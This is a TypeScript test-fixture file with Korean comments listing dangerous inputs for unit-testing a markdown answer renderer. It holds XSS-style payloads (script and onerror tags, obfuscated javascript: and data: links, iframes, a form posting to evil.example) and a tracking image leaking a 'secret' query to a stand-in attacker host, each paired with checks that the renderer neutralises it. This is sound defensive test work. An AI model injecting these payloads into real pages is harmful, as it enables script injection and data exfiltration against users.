// 위험한 입력 52가지(answer-markdown 명세 "부품의 단위 시험", ADR 0053 결정 "시험"). 원천은 프로브의 사례 파일
// (`.scratch/answer-markdown/probes/markdown_render/probe/cases.mjs`)이고 입력은 글자 그대로 옮겼다. `must` 는 규칙 하나(`rules.ts`
// 의 `violations`) 말고 그 사례가 더 지켜야 하는 것이다. 어기면 어긴 것을 글로 돌려준다.
//
// 문장 끝 번호와 출처 덩이를 다듬는 변환(티켓 02)이 바꾸지 않는 것만 건다. 그 변환이 `[1]` 을 대괄호 없는 위첨자로 바꾸므로,
// 원천의 `[1]` 이 글에 있다는 단언(`r10`, `x14`)은 `[1]` 없이 건다.
import { exactly, includes, noAnchors, oneAnchor, type Analysis } from "./rules";

export interface DangerCase {
  readonly id: string;
  readonly input: string;
  /** 그려진 글에 이 글자 그대로가 있어야 하는 것(원시 HTML 이 글자로 보이는지). */
  readonly shown?: string;
  readonly must?: (result: Analysis) => string[];
}

const FENCE = "```";
const TABLE = [
  "| 조문 | 내용 |",
  "|---|---|",
  "| 제750조 | 불법행위 |",
  "| 제751조 | 재산 이외의 손해 |",
].join("\n");

export const DANGER_CASES: readonly DangerCase[] = [
  // ── 요청이 적은 열한 가지 ──
  {
    id: "r01-raw-img",
    input: "<img src=x onerror=alert(1)>",
    shown: "<img src=x onerror=alert(1)>",
  },
  { id: "r02-raw-script", input: "<script>alert(1)</script>", shown: "<script>alert(1)</script>" },
  {
    id: "r03-js-link",
    input: "[클릭](javascript:alert(1))",
    must: (r) => [...noAnchors(r), ...includes(r, "클릭")],
  },
  {
    id: "r04-data-link",
    input: "[클릭](data:text/html,<script>alert(1)</script>)",
    must: (r) => [...noAnchors(r), ...includes(r, "클릭")],
  },
  {
    id: "r04b-data-link-base64",
    input: "[클릭](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
    must: (r) => [...noAnchors(r), ...includes(r, "클릭")],
  },
  {
    id: "r05-tracking-image",
    input: "![추적](https://evil.example/p.png?q=secret)",
    must: (r) => noAnchors(r),
  },
  {
    id: "r06-normal-link",
    input: "[정상](https://www.law.go.kr/)",
    must: (r) => oneAnchor(r, "https://www.law.go.kr/", "정상"),
  },
  {
    id: "r07-gfm-table",
    input: TABLE,
    must: (r) => exactly(r, { table: 1, thead: 1, tbody: 1, tr: 3, th: 2, td: 4 }),
  },
  {
    id: "r08-ordered-list",
    input: "1. 첫째\n2. 둘째\n3. 셋째",
    must: (r) => exactly(r, { ol: 1, li: 3 }),
  },
  {
    id: "r09-code-block",
    input: `${FENCE}python\nprint("<b>hi</b>")\nx = 1 * 2 * 3\n${FENCE}`,
    must: (r) => [
      ...exactly(r, { pre: 1, code: 1 }),
      ...includes(r, 'print("<b>hi</b>")\nx = 1 * 2 * 3'),
    ],
  },
  {
    id: "r10-korean-bold-footnote",
    input: "이 조항에서 **굵게** 적은 부분이 요건입니다[1].",
    must: (r) => [...exactly(r, { strong: 1 }), ...includes(r, "굵게")],
  },
  {
    id: "r11-plain-single",
    input: "4",
    must: (r) => (r.text.trim() === "4" ? [] : [`글이 "4"가 아니다: ${JSON.stringify(r.text)}`]),
  },
  {
    id: "r11b-plain-multiline",
    input: "첫째 줄\n둘째 줄\n\n셋째 줄",
    must: (r) => [...includes(r, "첫째 줄"), ...includes(r, "둘째 줄"), ...includes(r, "셋째 줄")],
  },

  // ── 마크다운이 아닌 글 ──
  { id: "x01-plain-asterisks", input: "2*3*4 = 24" },
  { id: "x02-plain-underscores", input: "snake_case_name 과 __init__.py" },
  { id: "x03-plain-angle", input: "a < b 이고 List<String> 은 b > c" },
  {
    id: "x04-plain-leading-markers",
    input: "# 은 주석 기호다\n1. 은 번호다\n- 3 은 음수다\n    네 칸 들여쓴 줄",
  },
  { id: "x05-html-entities", input: "&lt;script&gt; &amp; &copy; &#x3C;b&#x3E;" },
  {
    id: "x06-plain-frontmatter-like",
    input: "---\n제목: 안내\n---\n본문입니다",
    must: (r) => [...includes(r, "제목: 안내"), ...includes(r, "본문입니다")],
  },

  // ── 한국어와 출처 표기 ──
  {
    id: "x10-korean-flanking-paren",
    input: "**민법 제750조(불법행위)**는 고의 또는 과실을 요건으로 합니다.",
  },
  { id: "x11-korean-flanking-quote", input: '여기서 **"손해"**란 재산의 손해를 말합니다.' },
  { id: "x12-korean-bold-particle", input: "**굵게**입니다. *기울임*도 됩니다." },
  {
    id: "x13-ref-definition",
    input: "판례에 따르면 그렇습니다[1].\n\n[1]: https://www.law.go.kr/",
  },
  {
    id: "x14-source-list",
    input: [
      "가능합니다[1][2].",
      "",
      "출처",
      "[1] 민법 제750조 (갱신 2026-01-02) https://www.law.go.kr/법령/민법",
      "[2] 안내문 <https://www.law.go.kr/>",
    ].join("\n"),
    must: (r) => [...includes(r, "민법 제750조"), ...includes(r, "안내문")],
  },
  { id: "x15-footnote-gfm", input: "본문입니다[^1].\n\n[^1]: 각주의 글입니다." },

  // ── 자동 링크와 주소 ──
  {
    id: "x20-autolink-bare",
    input:
      "https://www.law.go.kr/법령/민법 을 보세요. www.law.go.kr 도 같습니다. 문의는 help@example.com",
    must: (r) => includes(r, "help@example.com"),
  },
  {
    id: "x21-autolink-angle-js",
    input: "<javascript:alert(1)> 와 <mailto:a@example.com>",
    must: (r) => noAnchors(r),
  },
  { id: "x22-js-case", input: "[a](JaVaScRiPt:alert(1))", must: (r) => noAnchors(r) },
  {
    id: "x23-js-entity",
    input:
      "[a](&#106;avascript:alert(1)) [b](javascript&colon;alert(1)) [c](&#x6A;avascript&#58;alert(1))",
    must: (r) => noAnchors(r),
  },
  {
    id: "x24-js-whitespace",
    input:
      "[a](<java\tscript:alert(1)>) [b](<  javascript:alert(1)>) [c](<\u0001javascript:alert(1)>)",
    must: (r) => noAnchors(r),
  },
  {
    id: "x25-other-schemes",
    input: [
      "[a](vbscript:msgbox(1))",
      "[b](file:///C:/Windows/win.ini)",
      "[c](mailto:a@example.com)",
      "[d](tel:+82-2-0000-0000)",
      "[e](blob:https://evil.example/1)",
      "[f](ftp://evil.example/)",
    ].join(" "),
    must: (r) => noAnchors(r),
  },
  {
    id: "x26-relative-links",
    input: "[a](/admin) [b](//evil.example/x) [c](#frag) [d](?q=1) [e](evil.example)",
    must: (r) => noAnchors(r),
  },
  {
    id: "x27-link-title-and-encoding",
    input: '[법](https://www.law.go.kr/법령/민법?a=1&b=2#제750조 "제목")',
    must: (r) =>
      r.anchors.length === 1 ? [] : [`링크 하나를 기대했다: ${JSON.stringify(r.anchors)}`],
  },
  {
    id: "x28-link-userinfo",
    input: "[은행](https://www.law.go.kr@evil.example/login)",
    must: (r) => noAnchors(r),
  },

  // ── 원시 HTML 의 다른 모양 ──
  {
    id: "x30-raw-anchor-js",
    input: '<a href="javascript:alert(1)">링크</a>',
    shown: '<a href="javascript:alert(1)">링크</a>',
    must: (r) => noAnchors(r),
  },
  {
    id: "x31-raw-iframe",
    input: '<iframe src="https://evil.example/"></iframe>',
    shown: '<iframe src="https://evil.example/"></iframe>',
  },
  { id: "x32-raw-svg", input: "<svg onload=alert(1)></svg>", shown: "<svg onload=alert(1)></svg>" },
  {
    id: "x33-raw-style",
    input: "<style>*{display:none}</style>\n\n보이는 글",
    must: (r) => includes(r, "보이는 글"),
  },
  {
    id: "x34-raw-block-div",
    input: '<div onclick="alert(1)">\n\n**블록**\n\n</div>\n\n다음 문단',
    must: (r) => includes(r, "다음 문단"),
  },
  {
    id: "x35-raw-comment",
    input: "앞 <!-- 주석 --> 뒤",
    must: (r) => [...includes(r, "앞"), ...includes(r, "뒤")],
  },
  {
    id: "x36-raw-inline-mixed",
    input: "<b>굵게</b>와 **굵게** 그리고 <br> 과 <input type=checkbox checked>",
    must: (r) => exactly(r, { b: 0, strong: 1 }),
  },
  {
    id: "x37-raw-details-form",
    input:
      '<details open><summary>열기</summary><form action="https://evil.example/"><button formaction="javascript:alert(1)">전송</button></form></details>',
  },
  {
    id: "x38-raw-unclosed",
    input: '<img src="https://evil.example/p.png"\n\n다음 문단 <script',
    must: (r) => includes(r, "다음 문단"),
  },

  // ── 이미지의 다른 모양 ──
  {
    id: "x40-image-in-link",
    input: "[![추적](https://evil.example/p.png)](https://www.law.go.kr/)",
    must: (r) => oneAnchor(r, "https://www.law.go.kr/"),
  },
  { id: "x41-image-reference", input: "![추적][img]\n\n[img]: https://evil.example/p.png" },
  {
    id: "x42-image-title-no-alt",
    input: '![](https://evil.example/p.png "제목") 뒤의 글',
    must: (r) => includes(r, "뒤의 글"),
  },

  // ── GFM 의 나머지 ──
  {
    id: "x50-task-list",
    input: "- [ ] 할 일\n- [x] 한 일",
    must: (r) => exactly(r, { ul: 1, li: 2 }),
  },
  {
    id: "x51-table-align",
    input: "| 왼 | 가운데 | 오 |\n|:--|:-:|--:|\n| a | b | c |",
    must: (r) => exactly(r, { table: 1, th: 3, td: 3 }),
  },
  {
    id: "x52-table-inline",
    input:
      "| 조문 | 링크 |\n|---|---|\n| **제750조** | [법](https://www.law.go.kr/) |\n| `a\\|b` | ![x](https://evil.example/p.png) |",
    must: (r) => [
      ...exactly(r, { table: 1, strong: 1, td: 4 }),
      ...oneAnchor(r, "https://www.law.go.kr/"),
    ],
  },
  {
    id: "x53-blocks",
    input: "# 제목\n\n## 소제목\n\n> 인용\n\n---\n\n~~취소~~ `코드`\n\n- 가\n  - 나\n    1. 다",
    // 제목은 한 단계 낮춰 그려서 `#` 은 h2, `##` 은 h3 이다.
    must: (r) =>
      exactly(r, {
        h1: 0,
        h2: 1,
        h3: 1,
        blockquote: 1,
        hr: 1,
        del: 1,
        code: 1,
        ul: 2,
        ol: 1,
        li: 3,
      }),
  },
  { id: "x54-hard-break", input: "두 칸으로 끝난 줄  \n다음 줄\\\n셋째 줄" },
  {
    id: "x55-inline-code-html",
    input: "인라인 `<script>alert(1)</script>` 과 `**별**`",
    must: (r) => [...includes(r, "<script>alert(1)</script>"), ...includes(r, "**별**")],
  },
];
